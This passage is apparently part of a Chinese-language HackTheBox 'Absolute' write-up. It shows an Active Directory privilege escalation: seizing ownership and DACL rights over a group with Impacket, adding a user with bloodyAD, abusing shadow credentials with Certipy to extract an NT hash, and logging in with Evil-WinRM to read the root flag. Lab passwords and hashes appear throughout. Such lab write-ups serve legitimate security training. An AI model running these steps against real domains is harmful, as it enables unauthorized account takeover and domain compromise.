a2582d1fabe02d183e93c5c49365aadf1ceb954773d5379821fee05c0ca438f17622cff1b4a2a69a7f6f6b805e541c299139ff37e500444c3046b22c51295569637ca61176925e500acfcb0a4c366e7b573f885826e9879d9b6f06bcb5e043133b529f1f469607a8770b4f289fefe2b09c6959f5bbb2c683c9a7d84294d057480a90658b1473609e778b407100eeb9583c970970c3c008c517e2e947f19191afd80510c977d6ad0c254ec7e84eeac243dd041871173d079624a00f41a77e97812dca629df58652a8bdf960f370be57b8a81a815a6030e963da5643000fe07edceb54dec639353c4e8c084950f6538bc1e309fbb20d4849b1f89074d3d492588a60c0b2e7ccd0dddf0e9fefaf3dec88722822f6996092b658894c8aa3d3168f8212acc55b4f990f6803aef85c238fc60239ebd44753642fcd159c6a12f605d43bdc8bd84051d27aceb7ba4db8c9e16ab2d1adbebfe7b6be6a6a7898a0906b9ae40fcdc293247f4c3c9dccc160
[*] bind: 0
[*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS
[*] apRep1: 6f8188308185a003020105a10302010fa2793077a003020112a270046eb8deb8e69f4b64f229c2e3be3eaec8d191a0748325bd69af97e795eb55fc2ae7d063209fb10123a61dd7ce8a31e8ae70520ecaab7404a4619dc788c437da1b19c7214d3bbf16725bc24a8b40cc90fe7835e8fdf20af1add0b97354e9e7c95893606dd9643be5cec14c1ca212b733
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection
[*] apRep2: 6f5b3059a003020105a10302010fa24d304ba003020112a2440442ad4d430b71613c2ce0c9e3a82bde62ce4987b6a5d579e695957ed98e5699cc17ebf35e470ad9fa8cb7b9caadd10f9f632ad0c854d170d2e9f2f93c688e39ea52b879
[*] bind: 0
[*] ldap_get_option: LDAP_SUCCESS
[+] LDAP session established
[*] ldap_modify: LDAP_SUCCESS
```

验证组成员。

```bash
*Evil-WinRM* PS C:\programdata\Apps> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
winrm_user
The command completed successfully.

```

加入 `Administrators` 组后必须重新取票。旧票据的 PAC 里没有管理员组，即使组里已经有这个账号，登录后拿到的令牌仍然不是管理员。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ impacket-owneredit -k -no-pass 'absolute.htb/m.lovegod' -dc-ip dc.absolute.htb -new-owner m.lovegod -target 'Network Audit' -action write
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-4078382237-1492182817-2568127209-1109
[*] - sAMAccountName: m.lovegod
[*] - distinguishedName: CN=m.lovegod,CN=Users,DC=absolute,DC=htb
[*] OwnerSid modified successfully!
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ impacket-dacledit  -k -no-pass 'absolute.htb/m.lovegod' -dc-ip dc.absolute.htb -principal m.lovegod -target 'Network Audit' -action write -rights FullControl
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20260917-153157.bak
[*] DACL modified successfully!
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ bloodyad --host dc.absolute.htb -d absolute.htb -k add groupMember 'Network Audit' m.lovegod
[+] m.lovegod added to Network Audit
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ impacket-getTGT 'absolute.htb/m.lovegod:AbsoluteLDAP2022!' -dc-ip 10.129.232.60
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in m.lovegod.ccache
```

重新登录。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ rm -f winrm_user.ccache
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ certipy-ad shadow auto -k -no-pass -u 'absolute.htb/m.lovegod@dc.absolute.htb' \
  -dc-ip 10.129.232.60 -dc-host dc.absolute.htb -target dc.absolute.htb -account winrm_user
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_user'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '3a21ad24a27c41cebd3a879263474231'
[*] Adding Key Credential with device ID '3a21ad24a27c41cebd3a879263474231' to the Key Credentials for 'winrm_user'
[*] Successfully added Key Credential with device ID '3a21ad24a27c41cebd3a879263474231' to the Key Credentials for 'winrm_user'
[*] Authenticating as 'winrm_user' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_user@absolute.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_user.ccache'
[*] Wrote credential cache to 'winrm_user.ccache'
[*] Trying to retrieve NT hash for 'winrm_user'
[*] Restoring the old Key Credentials for 'winrm_user'
[*] Successfully restored the old Key Credentials for 'winrm_user'
[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ export KRB5CCNAME=$PWD/winrm_user.ccache
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ evil-winrm -i dc.absolute.htb -r ABSOLUTE.HTB
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_user\Documents> whoami
absolute\winrm_user
*Evil-WinRM* PS C:\Users\winrm_user\Documents> type C:\Users\Administrator\Desktop\root.txt
a2d50576244f557523231faa969da749
```